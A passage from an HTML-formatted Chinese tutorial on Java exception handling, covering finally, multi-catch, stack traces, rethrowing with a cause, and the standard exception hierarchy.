catch</code>机制还提供了<code>finally</code>语句，<code>finally</code>语句块保证有无错误都会执行。上述代码可以改写如下：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">try</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token function\">process1</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">process2</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">process3</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">UnsupportedEncodingException</span> e<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Bad encoding\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">IOException</span> e<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"IO error\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span> <span class=\"token keyword\">finally</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"END\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>注意<code>finally</code>有几个特点：</p>\n<ol>\n<li><code>finally</code>语句不是必须的，可写可不写；</li>\n<li><code>finally</code>总是最后执行。</li>\n</ol>\n<p>如果没有发生异常，就正常执行<code>try { ... }</code>语句块，然后执行<code>finally</code>。如果发生了异常，就中断执行<code>try { ... }</code>语句块，然后跳转执行匹配的<code>catch</code>语句块，最后执行<code>finally</code>。</p>\n<p>可见，<code>finally</code>是用来保证一些代码必须执行的。</p>\n<p>某些情况下，可以没有<code>catch</code>，只使用<code>try ... finally</code>结构。例如：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token keyword\">void</span> <span class=\"token function\">process</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> file<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">IOException</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">try</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>\n    <span class=\"token punctuation\">}</span> <span class=\"token keyword\">finally</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"END\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>因为方法声明了可能抛出的异常，所以可以不写<code>catch</code>。</p>\n<h3>捕获多种异常</h3>\n<p>如果某些异常的处理逻辑相同，但是异常本身不存在继承关系，那么就得编写多条<code>catch</code>子句：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">try</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token function\">process1</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">process2</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">process3</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">IOException</span> e<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Bad input\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">NumberFormatException</span> e<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Bad input\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Exception</span> e<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Unknown error\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>因为处理<code>IOException</code>和<code>NumberFormatException</code>的代码是相同的，所以我们可以把它两用<code>|</code>合并到一起：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">try</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token function\">process1</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">process2</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">process3</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">IOException</span> <span class=\"token operator\">|</span> <span class=\"token class-name\">NumberFormatException</span> e<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token comment\">// IOException或NumberFormatException</span>\n        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Bad input\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Exception</span> e<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Unknown error\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><h2>抛出异常</h2>\n<h3>异常的传播</h3>\n<p>当某个方法抛出了异常时，如果当前方法没有捕获异常，异常就会被抛到上层调用方法，直到遇到某个<code>try ... catch</code>被捕获为止：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token comment\">// exception</span>\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Main</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">try</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token function\">process1</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Exception</span> e<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n            e<span class=\"token punctuation\">.</span><span class=\"token function\">printStackTrace</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">process1</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token function\">process2</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">process2</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token class-name\">Integer</span><span class=\"token punctuation\">.</span><span class=\"token function\">parseInt</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 会抛出NumberFormatException</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>通过<code>printStackTrace()</code>可以打印出方法的调用栈，类似：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token class-name\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>lang<span class=\"token punctuation\">.</span></span>NumberFormatException</span><span class=\"token operator\">:</span> <span class=\"token keyword\">null</span>\n    at java<span class=\"token punctuation\">.</span>base<span class=\"token operator\">/</span><span class=\"token class-name\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>lang<span class=\"token punctuation\">.</span></span>Integer</span><span class=\"token punctuation\">.</span><span class=\"token function\">parseInt</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Integer</span><span class=\"token punctuation\">.</span>java<span class=\"token operator\">:</span><span class=\"token number\">614</span><span class=\"token punctuation\">)</span>\n    at java<span class=\"token punctuation\">.</span>base<span class=\"token operator\">/</span><span class=\"token class-name\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>lang<span class=\"token punctuation\">.</span></span>Integer</span><span class=\"token punctuation\">.</span><span class=\"token function\">parseInt</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Integer</span><span class=\"token punctuation\">.</span>java<span class=\"token operator\">:</span><span class=\"token number\">770</span><span class=\"token punctuation\">)</span>\n    at <span class=\"token class-name\">Main</span><span class=\"token punctuation\">.</span><span class=\"token function\">process2</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Main</span><span class=\"token punctuation\">.</span>java<span class=\"token operator\">:</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span>\n    at <span class=\"token class-name\">Main</span><span class=\"token punctuation\">.</span><span class=\"token function\">process1</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Main</span><span class=\"token punctuation\">.</span>java<span class=\"token operator\">:</span><span class=\"token number\">12</span><span class=\"token punctuation\">)</span>\n    at <span class=\"token class-name\">Main</span><span class=\"token punctuation\">.</span><span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Main</span><span class=\"token punctuation\">.</span>java<span class=\"token operator\">:</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span>\n</code></pre></div><p><code>printStackTrace()</code>对于调试错误非常有用，上述信息表示：<code>NumberFormatException</code>是在<code>java.lang.Integer.parseInt</code>方法中被抛出的，从下往上看，调用层次依次是：</p>\n<ol>\n<li><code>main()</code>调用<code>process1()</code>；</li>\n<li><code>process1()</code>调用<code>process2()</code>；</li>\n<li><code>process2()</code>调用<code>Integer.parseInt(String)</code>；</li>\n<li><code>Integer.parseInt(String)</code>调用<code>Integer.parseInt(String, int)</code>。</li>\n</ol>\n<p>查看<code>Integer.java</code>源码可知，抛出异常的方法代码如下：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">int</span> <span class=\"token function\">parseInt</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> s<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> radix<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">NumberFormatException</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>s <span class=\"token operator\">==</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">throw</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">NumberFormatException</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"null\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>并且，每层调用均给出了源代码的行号，可直接定位。</p>\n<h3>抛出异常</h3>\n<p>当发生错误时，例如，用户输入了非法的字符，我们就可以抛出异常。</p>\n<p>如何抛出异常？参考<code>Integer.parseInt()</code>方法，抛出异常分两步：</p>\n<ol>\n<li>创建某个<code>Exception</code>的实例；</li>\n<li>用<code>throw</code>语句抛出。</li>\n</ol>\n<p>下面是一个例子：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token keyword\">void</span> <span class=\"token function\">process2</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> s<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>s<span class=\"token operator\">==</span><span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token class-name\">NullPointerException</span> e <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">NullPointerException</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">throw</span> e<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>实际上，绝大部分抛出异常的代码都会合并写成一行：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token keyword\">void</span> <span class=\"token function\">process2</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> s<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>s<span class=\"token operator\">==</span><span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">throw</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">NullPointerException</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>如果一个方法捕获了某个异常后，又在<code>catch</code>子句中抛出新的异常，就相当于把抛出的异常类型“转换”了：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token keyword\">void</span> <span class=\"token function\">process1</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> s<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">try</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token function\">process2</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">NullPointerException</span> e<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">throw</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">IllegalArgumentException</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">process2</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> s<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>s<span class=\"token operator\">==</span><span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">throw</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">NullPointerException</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>当<code>process2()</code>抛出<code>NullPointerException</code>后，被<code>process1()</code>捕获，然后抛出<code>IllegalArgumentException()</code>。</p>\n<p>如果在<code>main()</code>中捕获<code>IllegalArgumentException</code>，我们看看打印的异常栈：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token comment\">// exception</span>\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Main</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">try</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token function\">process1</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Exception</span> e<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n            e<span class=\"token punctuation\">.</span><span class=\"token function\">printStackTrace</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">process1</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">try</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token function\">process2</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">NullPointerException</span> e<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token keyword\">throw</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">IllegalArgumentException</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">process2</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">throw</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">NullPointerException</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>打印出的异常栈类似：</p>\n<div class=\"language-plain\" data-ext=\"plain\" data-title=\"plain\"><pre class=\"language-plain\"><code>java.lang.IllegalArgumentException\n    at Main.process1(Main.java:15)\n    at Main.main(Main.java:5)\n</code></pre></div><p>这说明新的异常丢失了原始异常信息，我们已经看不到原始异常<code>NullPointerException</code>的信息了。</p>\n<p>为了能追踪到完整的异常栈，在构造异常的时候，把原始的<code>Exception</code>实例传进去，新的<code>Exception</code>就可以持有原始<code>Exception</code>信息。对上述代码改进如下：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token comment\">// exception</span>\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Main</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">try</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token function\">process1</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Exception</span> e<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n            e<span class=\"token punctuation\">.</span><span class=\"token function\">printStackTrace</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">process1</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">try</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token function\">process2</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">NullPointerException</span> e<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token keyword\">throw</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">IllegalArgumentException</span><span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">process2</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">throw</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">NullPointerException</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>运行上述代码，打印出的异常栈类似：</p>\n<div class=\"language-plain\" data-ext=\"plain\" data-title=\"plain\"><pre class=\"language-plain\"><code>java.lang.IllegalArgumentException: java.lang.NullPointerException\n    at Main.process1(Main.java:15)\n    at Main.main(Main.java:5)\nCaused by: java.lang.NullPointerException\n    at Main.process2(Main.java:20)\n    at Main.process1(Main.java:13)\n</code></pre></div><p>注意到<code>Caused by: Xxx</code>，说明捕获的<code>IllegalArgumentException</code>并不是造成问题的根源，根源在于<code>NullPointerException</code>，是在<code>Main.process2()</code>方法抛出的。</p>\n<p>在代码中获取原始异常可以使用<code>Throwable.getCause()</code>方法。如果返回<code>null</code>，说明已经是“根异常”了。</p>\n<p>有了完整的异常栈的信息，我们才能快速定位并修复代码的问题。</p>\n<p>如果我们在<code>try</code>或者<code>catch</code>语句块中抛出异常，<code>finally</code>语句是否会执行？例如：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token comment\">// exception</span>\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Main</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">try</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token class-name\">Integer</span><span class=\"token punctuation\">.</span><span class=\"token function\">parseInt</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"abc\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Exception</span> e<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"catched\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">throw</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">RuntimeException</span><span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span> <span class=\"token keyword\">finally</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"finally\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>上述代码执行结果如下：</p>\n<div class=\"language-plain\" data-ext=\"plain\" data-title=\"plain\"><pre class=\"language-plain\"><code>catched\nfinally\nException in thread \"main\" java.lang.RuntimeException: java.lang.NumberFormatException: For input string: \"abc\"\n    at Main.main(Main.java:8)\nCaused by: java.lang.NumberFormatException: For input string: \"abc\"\n    at ...\n</code></pre></div><p>第一行打印了<code>catched</code>，说明进入了<code>catch</code>语句块。第二行打印了<code>finally</code>，说明执行了<code>finally</code>语句块。</p>\n<p>因此，<strong>在<code>catch</code>中抛出异常，不会影响<code>finally</code>的执行。JVM会先执行<code>finally</code>，然后抛出异常。</strong></p>\n<h2>自定义异常</h2>\n<p>Java标准库定义的常用异常包括：</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>Exception\n├─ RuntimeException\n│  ├─ NullPointerException\n│  ├─ IndexOutOfBoundsException\n│  ├─ SecurityException\n│  └─ IllegalArgumentException\n│     └─ NumberFormatException\n├─ IOException\n│  ├─ UnsupportedCharsetException\n│  ├─ FileNotFoundException\n│  └─ SocketException\n├─ ParseException\n├─ GeneralSecurityException\n├─ SQLException\n└─ TimeoutException\n</code></pre></div><p>当我们在代码中需要抛出异常时，尽量使用JDK已定义的异常类型。例如，参数检查不合法，应该抛出<code>IllegalArgumentException</code>：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">process1</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> age<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    